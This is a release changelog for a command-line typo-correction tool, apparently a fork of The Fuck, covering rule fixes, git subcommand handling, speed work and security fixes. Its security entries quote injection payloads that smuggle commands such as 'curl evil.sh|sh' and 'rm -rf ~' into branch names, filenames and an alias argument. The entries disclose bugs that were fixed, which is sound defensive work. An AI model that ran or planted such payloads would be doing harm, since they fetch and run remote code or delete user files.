- **Four more rules had gone dead against current git, and two of them
  crashed.** All four had green tests, because every fixture was written by hand
  from the wording of the day. They are now parametrised over what git 2.30.2,
  2.39.5 and 2.47.3 actually print, captured from each.
  - `git_branch_exists` wanted `fatal: A branch named 'x' already exists.` --
    capital, full stop. git 2.39 dropped both.
  - `git_two_dashes` wanted `` `--all` (with two dashes ?)``. Every git tested
    prints `(with two dashes)?`, with the question mark outside the bracket, so
    this had never matched any of them.
  - `git_help_aliased` read the alias by splitting the output on a backtick.
    git prints `'st' is aliased to 'status'` and has for years, so the split
    raised `IndexError` -- a traceback in the terminal of anybody who ran
    `git help <alias>`.
  - `git_bisect_usage` took the subcommand from a regex without checking it had
    matched, so a bare `git bisect` -- which is how you discover you forgot the
    subcommand -- raised `IndexError` instead of politely offering nothing.
- **A mistyped subcommand is no longer a question.** 4.0.0 stopped running your
  previous command a second time without asking, and skipped asking only when
  there was no such program or the program was one that only ever reads. `git`
  could be neither -- `git push` is not a read -- so the single most common
  correction there is, a mistyped git subcommand, wanted a keypress before it
  would even look: `git satus` was treated exactly like `git push`.

  It no longer is. A program that dispatches on a subcommand does nothing
  whatever until it has recognised one, so a subcommand it does not have fails
  at dispatch the second time exactly as it did the first -- the same certainty
  as a program the shell cannot find, one level down. Nothing about the
  judgement widened: git is asked for its own list of subcommands rather than
  being matched against one written down here, so a subcommand added to git
  later is not mistaken for a typo. A subcommand git does have is still asked
  about, `git status` as much as `git push`, since whether it writes depends on
  the flags; so is an alias, which git lists among its subcommands and which can
  stand for anything including `!deploy.sh`; and so is anything with git's own
  options before the subcommand, such as `git -C /tmp satus`. An old git, a git
  that will not answer, or an answer that is empty all ask, as before.

  `cargo` is in on the same terms, from `cargo --list`. `npm`, `docker`, `uv`,
  `apt-get`, `kubectl` and `yarn` are not, and the bar they failed is worth
  writing down: the list has to be *complete*, because a word missing from it
  looks like a typo and its command then runs again unasked. `npm uninstal` is
  in neither `npm help` nor `npm -l`, runs, and rewrites your `package.json`;
  `uv build-backend` is in neither of uv's listings; `docker` prints a plugin as
  `compose*`, so the word that dispatches is missing and `docker compose up -d`
  would have been taken for a typo; `apt-get` calls its own list "Most used
  commands"; and `yarn` resolves an unrecognised word against the scripts in
  whatever `package.json` you are standing next to, so no listing can ever
  cover it. A `--help` screen is a document for a person, not a promise about
  what the program will accept.

  git's list is asked for without `nohelpers`, which would have been tidier and
  was wrong: it subtracts the eight `--`-suffixed commands, all of which
  dispatch, so `git web--browse http://x` looked like a typo and relaunched a
  browser unasked.

### Rules

- `argparse_invalid_choice` corrects a mistyped choice or subcommand in any
  tool built with Python's standard library `argparse` -- `pytest --color=ayt`,
  `mytool bulid` -- which is `pytest`, `mypy`, `pre-commit`, `tox`, `coverage`
  and a very long tail. The fourth of the framework rules in spirit: argparse
  prints the value it refused and every value it accepts, so nothing has to be
  guessed. By [@TrixSec](https://github.com/TrixSec) in
  [#5](https://github.com/stamparm/thebleep/pull/5). Its fixtures showed the
  choices unquoted, which argparse has never printed on any Python this project
  supports; they are captured from 3.9 through 3.14 now, along with the
  `--color/-c` shape an option with a short alias produces.
- `commander_suggestion` does the same for
  [commander.js](https://github.com/tj/commander.js), which is what most Node
  command line tools are written with -- `prettier --chekc .`, and `eslint`,
  `prisma`, `nest`, `turbo` and `webpack-cli` with nothing added for any of
  them. By [@TrixSec](https://github.com/TrixSec) in
  [#4](https://github.com/stamparm/thebleep/pull/4), and it needed nothing: the
  wording is byte-exact against commander 13.1.0, it goes through
  `replace_command` like its three siblings, and it comes with its own injection
  test.
- Four rules were dead against what their tool actually prints, each for
  however many releases ago the wording moved. The framework catches what a rule
  raises, which is the right failure model and also why nobody noticed: a rule
  that never fires looks exactly like a rule with nothing to say.

  - `git_add` matched the message with a full stop on the end and git dropped it.
  - `hostscli` read the whole error sentence instead of the name in it, and then
    looked for that sentence in the command you typed.
  - `git_rebase_merge_dir` found the `rm -fr ".git/rebase-merge"` line by
    counting back from the end of the output, which against the real message
    lands on a sentence of prose -- so it offered prose as a command and never
    offered the `rm`.
  - `git_fix_stash` looked for a `usage:` block and git stopped printing one for
    `git stash`. What it prints instead names the token it could not read, which
    is better evidence than the usage block ever was.

  So now every rule is asked: `tests/test_every_rule.py` throws malformed
  output, somebody else's error and one-word commands at all of them and holds
  them to not raising, and `thebleep --doctor` reports any that do.
- `invalid_argument_for_option` reads the values a tool lists after refusing
  one: `ls --sort=nmae` becomes `ls --sort=none`. The wording is gnulib's
  `argmatch`, so `du --time`, `ls --format`, `ls --quoting-style` and
  `df --output` come with it.
- `git_unknown_subcommand` reads the usage block git prints for a mistyped
  *second* word -- `git remote ad`, `git worktree lst`, `git notes ad`,
  `git sparse-checkout se`. git makes no "most similar command" suggestion for
  these; it lists the answers instead, and nothing was reading them.
- `missing_space_before_known_subcommand` answers the half of a missing space
  that is not a guess -- the rest is a flag, or a subcommand the program itself
  listed -- and answers it ahead of the spelling correction. The guessing half
  stays where it was: `whoiam` is two edits from `whoami` and one insertion from
  `who iam`, and distance cannot tell those apart.
- Nothing irreversible is offered on no evidence. A command that failed, with
  output that explains nothing, is never answered with `rm -rf`, `git reset`,
  `--force` or `--no-verify` -- checked against every rule, because that is the
  class both of the worst bugs here belonged to.
- `git_pull` no longer matches `git config pull.rebase`, and reads git's advice
  by looking for it rather than by counting lines from the end -- which is off by
  one between the two output readers, so the same failure was corrected in
  instant mode and not otherwise.
- `no_such_file` deferred to `cp_create_destination`, which does the same job
  more carefully. It used to suggest `mkdir` with no argument for a destination
  with no directory in it, and it fired when the *source* was what was missing.
- `long_form_help` matched case-insensitively and then answered
  case-sensitively, so it was dead for every lowercase spelling of `try 'x
  --help'` -- which is most of them.
- `git_flag_after_filename` had four ways to raise and took all of them: it
  called `match` again and dereferenced the result, indexed on a flag git had
  normalised, read a variable only assigned inside a loop, and indexed an empty
  name.
- `switch_lang` assigned to `command.script`, so every rule consulted after it
  saw a command you had not typed.
- Seven more rules put a value from a tool's output or your own history into a
  suggestion without quoting it, and a suggestion is `eval`led: `aws_cli`,
  `npm_wrong_command`, `path_from_history`, `option_typo`, `brew_install`,
  `workon_doesnt_exists` and `fab_command_not_found`. `path_from_history` keeps a
  leading `~` outside the quotes, because that is the one character there whose
  meaning the shell is meant to change.
- `kubectl gat pods` becomes `kubectl get pods`, sorted by how close each
  suggestion is to what was typed, because kubectl's own order offers `set`
  before `get`. Arrived as a `kubectl_unknown_command` rule
  (by [@TrixSec](https://github.com/TrixSec) in
  [#1](https://github.com/stamparm/thebleep/pull/1)) and is now part of
  `cobra_suggestion`, which does the same for every Go tool rather than for
  kubectl alone. The rule was right; it turned out to be one instance of
  something general.
- `uv piip install requests` becomes `uv pip install requests`, and a
  subcommand of a subcommand -- `uv pip instll`, `uv tool runn`,
  `uv python instal` -- works the same way. Arrived as a
  `uv_unknown_subcommand` rule
  (by [@TrixSec](https://github.com/TrixSec) in
  [#3](https://github.com/stamparm/thebleep/pull/3)) and is now part of
  `clap_suggestion`, which reads the same tip for every Rust tool. Writing it
  is what made the shape obvious.

## 4.0.2 — 2026-08-19

Nothing about the tool itself changed. `pip install --upgrade` is worth it only
if the PyPI page bothered you.

- The build badge is no longer on the PyPI page. Its image is served live from
  the default branch, so every version's page read out whatever master happened
  to be doing that day -- a red master put "build failing" on the page of a
  release that was green when it was made. It stays on the README, where it tells
  a contributor something true.
- The test matrix no longer runs twice for every release. A tag push is a `push`
  event and the concurrency group is keyed on the ref, so the same commit was
  tested once when it landed on master and again when it was tagged.
- Some tests of `release.py`'s own printed output are gone. They asserted the
  shape of strings a developer script prints, which cost a CI cycle every time
  anybody touched it.

## 4.0.1 — 2026-08-19

### Security

- **A branch name could run a command.** Seven rules read a name out of the
  failed command's own output and put it into the suggestion without quoting it,
  and the suggestion goes to your shell to be evaluated once you accept it. Only
  whitespace, control characters and `~^:?*[\\` are illegal in a git ref name, so
  `;`, `$()`, a backtick, `&`, `|` and `#` are all available to whoever named the
  branch — and a name is not something you chose when you are reviewing somebody
  else's work or have just cloned a repository.

  `git_push`, `git_pull` and `git_push_different_branch_names` take the branch
  out of git's own hint. `git_merge` takes a branch name from the remote.
  `git_help_aliased` takes an alias out of the repository's `.git/config`.
  `fix_file` takes a filename off disk, which is the one that needs no git at
  all: unpacking an archive is enough to put `a;curl evil.sh|sh .py` where a
  compiler will name it back at you. `yarn_alias` and `rails_migrations_pending`
  repeat a command line out of their tool's output, which is the same shape with
  less reachable data behind it.

  All eight quote what they read now, and all eight are in
  `tests/test_injection.py`, which runs each suggestion through a real shell with
  seven metacharacter payloads and fails if anything executes. That also settles
  a crash of long standing: a branch called `swteam/#486/general_contact_info`
  produced a suggestion that broke zsh's `eval`
  ([nvbn/thefuck#782](https://github.com/nvbn/thefuck/issues/782), and
  [#600](https://github.com/nvbn/thefuck/issues/600) and
  [#762](https://github.com/nvbn/thefuck/issues/762) before it), because the
  upstream fix for that was `.replace("'", r"\\'")` and only ever covered the
  apostrophe.

  Reported by [@robkorv](https://github.com/robkorv) in
  [#2](https://github.com/stamparm/thebleep/issues/2), with a working proof of
  concept for three of them; the other four came out of the sweep that followed.

## 4.0.0 — 2026-08-19

The first release of *The Bleep*, and the first release of this codebase since
*The Fuck* 3.32 in January 2022. The version continues *The Fuck*'s numbering
rather than restarting it, because this is the same codebase carried forward.

### New

- **Press tab to edit a correction instead of running it.** A suggestion is
  often ninety-five percent right, and the last five percent used to mean
  retyping it. `tab` at the confirmation prompt hands it to your shell's line
  editor with the cursor at the end; nothing runs until you press return. Zsh,
  Fish and Nushell put it in the next prompt (`print -z`, `commandline
  --replace`, `commandline edit --replace`),
  bash reopens it in readline (`read -e -i`), PowerShell makes it the newest
  history entry for `↑`. No `TIOCSTI`, no synthesised keystrokes: where a shell
  has no supported way to do it, the offer is not made. `--edit` makes it the
  behaviour of return for one run and `edit = True` makes it permanent.
  (based on [#1063](https://github.com/nvbn/thefuck/pull/1063),
  [#1104](https://github.com/nvbn/thefuck/pull/1104))
- **`--shell` says which shell you are in**, for the places where working it
  out from the process tree gets it wrong: containers, IDE terminals, wrapper
  scripts, `distrobox`. An unknown name is an error listing the known ones
  rather than a silent fallback to the generic shell, and naming the shell
  skips the walk up the process tree instead of adding to it.
  ([#1538](https://github.com/nvbn/thefuck/pull/1538))
- **Nushell is supported.** Shell detection, the alias, quoting, command
  chaining and history — both the plain-text and the SQLite one — with a real
  Nushell driving a real terminal in the tests. A correction there goes into
  your command line for you to submit, because Nushell has no `eval` by design
  and `nu -c` would run a corrected `cd` in a process that then exits. Chaining
  is `try { a; b }`: `and`/`or` in Nushell are boolean operators, not command
  separators, which is what the old patch for this got wrong.
  Its configuration is looked for where Nushell looks for it:
  `XDG_CONFIG_HOME` first on every platform — which is the order Nushell reads
  them in — then `%APPDATA%` on Windows and `~/Library/Application Support` on
  macOS, and on macOS `~/.config` as well, since either may be the one in use.
  (based on [#1442](https://github.com/nvbn/thefuck/pull/1442),
  [#1441](https://github.com/nvbn/thefuck/issues/1441),
  [#1254](https://github.com/nvbn/thefuck/issues/1254))
- **`thebleep --doctor`** checks the dozen things a bug report usually turns out
  to be: the alias in a file this shell does not read, `thebleep` on `PATH`
  being an older copy in another environment, a settings file with a typo in it
  so every setting was dropped, a `~/.config/thefuck` nobody copied over, an
  unwritable cache, a shell that was guessed wrong. It is safe to paste — names
  of settings and never their values, nothing out of the environment but the
  handful of names The Bleep defines, home folded back to `~` — and it changes
  nothing on the way: no config directory created, no settings file written, no
  rule pack built.
- **A command behind a wrapper is corrected as though it were on its own.**
  `sudo -u www-data git chekout main`, `env FOO=bar npm sart`, `nice -n 10
  cargo buld`, `nohup ./deply.sh` — `sudo`, `doas`, `env`, `command`,
  `builtin`, `nice`, `nohup`, `setsid` and `stdbuf` are peeled off, nested and
  in any combination, every rule sees what is underneath, and the
  wrapper comes back in front of the suggestion exactly as it was typed. One
  model for all 173 rules, where before there was a `sudo`-only decorator that
  26 of them had asked for individually. It refuses rather than guesses: not
  for `sudo -i`, `sudo -s`, `sudo -e`, `sudo -l` or `command -v`, which do not
  run the command; not past an option it does not recognise, which might be one
  that takes a value; and not through shell syntax, where the first word is not
  the only command anyway.
  (based on [#1101](https://github.com/nvbn/thefuck/pull/1101))
- **`?` at the prompt says why a suggestion is being made**: which rule it came
  from, whether that rule is bundled, one of yours or from a package, what it
  matched, whether it needed your command's output, whether accepting it does
  anything besides run the command, and whether it runs as another user. Every
  line is a fact about the rule rather than a description of it — the app it
  declares and the text it requires in the output are read out of its own
  `match`, by the same extraction that decides which rules to load at all — so
  a rule of your own explains itself as well as a bundled one does, and not one
  of the 173 needed a hand-written description. `--explain` starts that way and
  `explain = True` makes it permanent.

### It runs on current Python

- `distutils` is gone, which is what stopped *The Fuck* from starting on Python
  3.12 at all, and `pkg_resources` and `imp` went with it.
  ([#1499](https://github.com/nvbn/thefuck/pull/1499),
  [#1610](https://github.com/nvbn/thefuck/pull/1610),
  [#1552](https://github.com/nvbn/thefuck/issues/1552))
- Python 2 support removed.
  ([#1479](https://github.com/nvbn/thefuck/pull/1479),
  [#873](https://github.com/nvbn/thefuck/pull/873))
- Tested on Python 3.9 through 3.14, on Linux, macOS and Windows.

### Security

- The `sudo` rule no longer hands a re-quoted script to `sh -c` as root, where
  quoted data could be re-read as code.
- Filenames, branch names and URLs that rules read out of a failed command's
  own output are quoted before being put back into a command.
  (both [#1606](https://github.com/nvbn/thefuck/issues/1606))
- `open_command` quotes the URL it passes to the shell.
  ([#1531](https://github.com/nvbn/thefuck/issues/1531))
- **Names that come from somewhere else are quoted.** A correction is text your
  shell then evaluates, and much of that text is copied out of a place you do
  not control. git accepts a branch called `feature;rm -rf ~`, npm accepts a
  script called the same, and a Gruntfile task name is any string at all. With a
  repository carrying such a branch, a mistyped `git checkout` offered
  `git checkout feature;rm -rf ~` as its first suggestion. Quoted now in the
  helper behind two dozen rules and in the six that build their own suggestions.
- **The command being run again no longer inherits your shell's state.** Reading
  what your last command printed means running it again, and the environment it
  was handed included everything the alias had just put there — `TB_HISTORY` is
  your last ten commands and `TB_SHELL_ALIASES` is your alias list. A mistyped
  program name that happened to exist got both.
- **`GIT_TRACE=1` is set for git and for nothing else.** It was in the default
  environment for every command that got run again.
- **The alias name is checked before it is written into shell code.**
  `thebleep --alias-loader 'x; curl evil.sh|sh; f' >> ~/.bashrc` used to write a
  line that ran that at every shell startup.

### Safety

- **Instant mode's recording of your terminal is no longer world-readable.** It
  is a megabyte of everything that has scrolled past — the contents of every
  file read, every token a command printed, every password typed at a prompt
  that echoes — and it was created in `/tmp` with no mode at all, which is 0666
  less your umask. It is 0600 now, in `$XDG_RUNTIME_DIR` where there is one,
  opened with `O_EXCL` and `O_NOFOLLOW` so that a name somebody else got to
  first is refused rather than opened and a symlink left in the way is not
  followed.
- **Instant mode cleans up after itself.** Closing the terminal left the
  recording on disk, along with the logger and the shell inside it, for the
  rest of the login session: the copy loop it used waits on for a shell nobody
  can type at any more. The logger now removes its own recording however it
  leaves, and the shell that started it has a `trap` as a backstop for the one
  signal nothing can catch. Two more while there: a chunk of output that
  overflowed the recording was dropped rather than kept after the room was
  made, and a shell that exited normally left the terminal in raw mode.
- **The previous command is no longer run again without asking.** Correcting a
  command means knowing what it printed, and a shell keeps no record, so the
  command was run a second time — before any correction had been offered or
  agreed to. It is now confirmed first, unless there is no such program to run
  or the program is one that only ever reads. `confirm_replay = False` restores
  the old behaviour.
  ([#1126](https://github.com/nvbn/thefuck/issues/1126))
- **What you agree to is what runs.** Seven rules did more than they said, and
  now do only what they say:
  - `dirty_untar` and `dirty_unzip` deleted every file named in the archive
    after you accepted extracting it into a directory of its own. They could not
    tell an extracted file from one of yours under the same name, so a README in
    the archive meant yours was overwritten and then deleted; and the check
    meant to keep them inside the current directory was a string prefix test, so
    an archive member called `../foobar/precious` walked out of it. They leave
    the files alone.
  - `ssh_known_hosts` returned your own command unchanged and deleted the
    offending `known_hosts` line behind it, so a man-in-the-middle warning
    disappeared with nothing to read. It now suggests the `ssh-keygen -R` that
    ssh itself prints, in front of your command, with the file and host quoted.
    On the DNS-spoofing warning it used to delete the entry that was *correct*
    as well.
  - `rm_dir` adds `-r`, not `-rf`.
  - `pip_install` no longer falls back to `sudo pip install`.
  - `python_module_error` is off by default: an import name is not a
    distribution name, so the package it offers to install is a guess, and a
    mistyped import makes it `pip install <typo>`.
  - `quotation_marks` only fires when your command genuinely does not parse.
- **The list of commands that only read is shorter.** `uniq` takes an output
  file as its second operand, `file -C` writes a compiled magic file,
  `info --output` writes the page out, `less` runs whatever `LESSOPEN` names,
  and `man` writes into the cat page cache. Those, and the other pagers, are off
  it.
- **Suggestions come out in the same order every time.** Deduplication went
  through a set, and a set of corrections iterates by the hash of a string,
  which Python randomises per process — so with several suggestions at the same
  priority, which one the down arrow gave you was different on every run.

### Speed

Measured against *The Fuck* 3.32 on the same machine and the same Python 3.11,
median of 30 runs; the harness and the recorded run are in `bench/`.

- Opening a shell: 210 ms → 28 ms with `eval "$(thebleep --alias)"`, and with
  `--alias-loader` to nothing worth timing — the alias is defined on first use,
  so shell startup runs no Python at all.
- Correcting a mistyped command: 246 ms → 56 ms.
- Correcting after a command printed a megabyte: 3251 ms → 117 ms. This one is
  a correctness fix as much as a speed one: output used to be read only after
  the command exited, which deadlocks once the output fills the pipe buffer, so
  anything printing more than about 64 KB produced nothing to correct from.
- Rules are compiled once into a cache, and a command is only dispatched to the
  rules that could match it — around a fifth of the 173, rather than all of them.
- A rule that looked for twenty-eight different messages lowercased the whole
  output once per message. It lowercases it once.
- A correction opens roughly half the Python modules it used to: `ast`,
  `pickle`, `socket`, `uuid`, `tempfile`, `shutil`, `subprocess`, `difflib` and
  `colorama` are loaded only where they are used, `pyte`, `psutil`, `argparse`
  and `pprint` not at all, and `which` and `ShellConfiguration` no longer pull in
  `shutil` and `collections` to do what they do. `tests/test_performance.py`
  names every module that has to stay out and holds the total to a budget. This
  is what decides the cost on Windows, where a module is a file the interpreter
  must find and open and a scanner reads first.
- `python -m thebleep` runs the same entry point as the `thebleep` command, for
  environments whose scripts directory is not on `PATH`.

### Rules

New in this release:

- `zypper_no_such_command` — openSUSE and SLE had no rules at all, while apt,
  dnf, yum, pacman and brew each had theirs. zypper says which word it did not
  understand and then does not say what it could have been, so the candidates
  come from `zypper --help`, which lists every command with its abbreviations:
  `zypper isntall vim` becomes `zypper install vim`, and `zypper dpu` becomes
  `zypper dup`. Read out of `--help` rather than written into the rule, because a
  list in a rule file is a snapshot of whichever zypper its author had. Off
  unless `zypper` is installed.
- `pip_externally_managed` — since PEP 668, Debian, Ubuntu, Fedora and Arch all
  refuse `pip install` into the system Python. This offers what the error
  message itself recommends: `pipx install` for a single application where pipx
  is installed, and `python3 -m venv .venv && .venv/bin/pip install ...` for
  anything else. It deliberately does **not** offer `--break-system-packages`,
  which is in the message and is one word and is the one outcome the error
  exists to prevent — nor `sudo pip install`, nor `--user`, which PEP 668 marks
  as externally managed too.
  ([#1553](https://github.com/nvbn/thefuck/pull/1553))
- `docker_daemon_not_running` — `sudo systemctl start docker` in front of your
  command when Docker's daemon is not listening. Both spellings of the message
  are matched, the one Docker used up to 24 and the one it uses from 25. Only
  where `systemctl` is on the machine to run: `service docker start` and
  `open -a Docker` are each right somewhere else, and a suggestion that starts
  nothing is worse than none.
  ([#1102](https://github.com/nvbn/thefuck/pull/1102))
- `ping_url` — `ping https://github.com/` becomes `ping github.com`. The host is
  taken out with `urlsplit`, so a URL carrying a user name, a password or a port
  comes out as the host and nothing else.
  ([#1243](https://github.com/nvbn/thefuck/pull/1243))

And fixed:

- `chmod_x` now works for a script run by any path and not only `./one`:
  `scripts/deploy.sh`, `~/scripts/deploy.sh` and
  `/home/alice/scripts/deploy.sh` are the same mistake with the same fix, and
  three of the four got no correction. A bare name with no separator in it is
  still left alone — that is a `PATH` lookup, where the file that could not run
  is somewhere else entirely.
  ([#1470](https://github.com/nvbn/thefuck/pull/1470))
- `paru` is recognised alongside `yay`, `pikaur` and `yaourt`, and preferred
  over them, both for suggesting a package to install and for correcting a
  package name. The list lives in one place now, so adding a helper adds it to
  both rules.
  ([#1514](https://github.com/nvbn/thefuck/pull/1514))
- `get_closest` returns nothing rather than raising `IndexError` when there are
  no possibilities to be close to. A rule that asks npm or lein for its list of
  subcommands and finds the tool is not installed gets an empty list, and
  `npm_wrong_command` died of it.
- **A suggestion identical to the command you typed is not offered.** A rule
  that matches on something in the output and then finds nothing in the script
  to change hands your own command back, which reads as a correction, takes a
  place in the list the arrow keys walk, and runs the same failure again when
  accepted. `docker ps -q --filter` and `git stauts` each came with one. A rule
  with a side effect still may, because there the command being unchanged is the
  point.
- `missing_space_before_subcommand` knows the shell's builtins. They are not on
  `PATH`, so it read `command`, `time` and `builtin` as words nobody could run
  and offered to break `command git status` into `comm and git status`.


Refreshed against what the tools print today, found by running them rather than
by reading their old fixtures: `npm` 7+, `cargo` 1.73+, `docker` 25+, `brew` 4,
`gem` 3.2+, `az`, `gradle` 8, `terraform` 1.x, and `git` for `main` rather than
`master`. ([#1320](https://github.com/nvbn/thefuck/issues/1320),
[#1341](https://github.com/nvbn/thefuck/issues/1341),
[#1313](https://github.com/nvbn/thefuck/issues/1313))

- New rule `git_dubious_ownership`, for git refusing a repository it thinks
  somebody else owns.
  ([#1376](https://github.com/nvbn/thefuck/issues/1376))
- `brew install` no longer offers to install something when a `brew uninstall`
  failed, which it did because `install` is a substring of `uninstall`.
- Environment assignments are looked past when identifying a command, so
  `FOO=bar git brnch` is corrected.
  ([#1172](https://github.com/nvbn/thefuck/issues/1172))

### Fixed

- Crash walking an unreadable process tree, and on a process that exits while
  being killed. ([#1600](https://github.com/nvbn/thefuck/pull/1600),
  [#1509](https://github.com/nvbn/thefuck/issues/1509),
  [#1026](https://github.com/nvbn/thefuck/issues/1026),
  [#1040](https://github.com/nvbn/thefuck/issues/1040))
- Works with no terminal attached, and exits quietly on a closed pipe.
  ([#1562](https://github.com/nvbn/thefuck/pull/1562),
  [#1539](https://github.com/nvbn/thefuck/pull/1539))
- Works under `bash`/`zsh` with `set -u`, and with an empty alias value.
  ([#1355](https://github.com/nvbn/thefuck/pull/1355),
  [#1551](https://github.com/nvbn/thefuck/pull/1551))
- Fish history is read from the XDG data directory.
  ([#1258](https://github.com/nvbn/thefuck/pull/1258))
- Commands on Windows are found when the file is not spelled as typed.
  ([#1209](https://github.com/nvbn/thefuck/issues/1209),
  [#1296](https://github.com/nvbn/thefuck/issues/1296))
- The environment is no longer printed into debug output.
  ([#995](https://github.com/nvbn/thefuck/pull/995))
- The selection can be abandoned with the escape key.
  ([#1506](https://github.com/nvbn/thefuck/pull/1506))
- A correction is not applied when nobody confirmed it, which is what happened
  in a pipe, a subprocess or CI. Pass `--yes` to apply without asking.
- **The alias no longer breaks because of something you pasted.** Your recent
  history was passed in an environment variable, and the kernel will not hand a
  program one larger than 128K, so one pasted command that size made the alias
  fail with "Argument list too long" until the entry fell out of the window.
  ([#798](https://github.com/nvbn/thefuck/issues/798))
- **PowerShell.** A chained correction ran only its first half: `(a) -and (b)`
  tests whether `a` *printed* something rather than whether it worked, so
  `git add . && git commit` skipped the commit. Arguments were quoted the POSIX
  way, which PowerShell splits into several. A correction beginning with `echo`
  was silently discarded, so correcting `ehco test` did nothing. `TB_SHELL` was
  left in the session environment and `TB_ALIAS` was never set. The correction
  loop now runs in real Windows PowerShell 5.1 and 7 in CI.
- **A rule that fails is that rule's problem.** One that matched and then raised
  while working out its suggestion took the whole correction down with a
  traceback, losing every other rule's suggestions. Five rules that raised on a
  bare `go`, `composer`, `touch` or `sudo` were fixed too, and a file in your
  rules directory that is not a rule no longer stops corrections entirely.
- **One setting that cannot be understood costs one setting.** A single
  unparseable environment variable silently discarded every other one, so an
  `exclude_rules` you had set quietly came back. Values are checked, too:
  `THEBLEEP_DEBUG=1` used to mean no.
- **Only commands you could actually run are suggested.** Every file in a
  directory on `PATH` counted, so a README was offered as a command and a
  non-executable `realthinh` came back ahead of the `realthing` beside it. On
  Windows, `PATHEXT` decides.
- **A damaged rule cache cannot change which corrections exist.** A corrupt
  entry used to make that rule disappear; it falls back to the rule's source.
- Bash's first-run advice named `~/.bashrc` even when you only have
  `~/.bash_profile`.

### Packaging

- One wheel, the same everywhere. `setup.py` chose its entry points and its
  scripts by looking at `sys.platform` while the package was being *built*,
  which decides nothing useful for a `py3-none-any` wheel: the artifact a Windows
  user would have installed carried the POSIX entry points and none of the
  Windows ones.
- `decorator` and `win_unicode_console` are no longer dependencies, and
  `colorama` is only a dependency on Windows.
- Publishing happens in CI, from a version tag, over PyPI trusted publishing:
  the artifacts are built once, installed and exercised on Linux, macOS and
  Windows, and those exact files are what gets uploaded. There is no API token.
- `snapcraft.yaml` is gone. It used a syntax snapcraft removed years ago, so it
  could not have built, and nothing published it.
- The `bleep.bat` and `bleep.ps1` scripts are gone with it. `cmd.exe` was never
  a supported shell, and a `bleep.exe` from the entry point takes precedence
  over a `.bat` anyway.

### Renamed from The Fuck

The command is `thebleep`, the alias it installs is `bleep`, settings live in
`$XDG_CONFIG_HOME/thebleep/`, and environment variables are `THEBLEEP_*`. See
[Coming from The Fuck](README.md#coming-from-the-fuck) — the settings file
copies over unchanged, and `thebleep --alias-loader fuck` keeps the word you
are used to.
